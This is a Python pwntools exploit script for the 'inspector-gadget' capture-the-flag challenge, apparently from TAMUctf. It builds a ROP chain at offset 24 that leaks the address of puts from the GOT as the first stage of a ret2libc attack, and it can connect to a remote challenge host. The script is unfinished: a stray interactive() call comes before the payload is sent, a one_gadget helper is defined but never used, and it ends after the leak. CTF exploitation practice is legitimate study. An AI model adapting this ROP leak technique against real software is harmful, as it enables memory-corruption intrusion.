#!/usr/bin/env python3

from pwn import *

elf = ELF("./inspector-gadget")
libc = ELF("/lib/libc.so.6")

context.update(binary=elf, encoding='latin-1')

def one_gadgets(filename, base_addr=0):
    return [
        (int(i) + base_addr)
        for i in subprocess.check_output(["one_gadget", "--raw", "-l0", filename])
        .decode()
        .split(" ")
    ]

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    elif args.REMOTE:
        return remote("tamuctf.com", 443, ssl=True, sni="inspector-gadget")
    else:
        return process([elf.path])


OFFSET = 24
def main():
    io = start()
    io.interactive()

    io.clean(2)

    rop = ROP(elf)
    rop.puts(elf.got.puts)
    rop.pwnme()
    io.fit(
                    {OFFSET: rop.chain()}
                    )

    puts_leak = u64(io.recvline(2).strip().ljust(8, b"\x00"))
    success(f"puts leak: {hex(puts_leak)}")



    io.interactive()


if __name__ == "__main__":
    main()
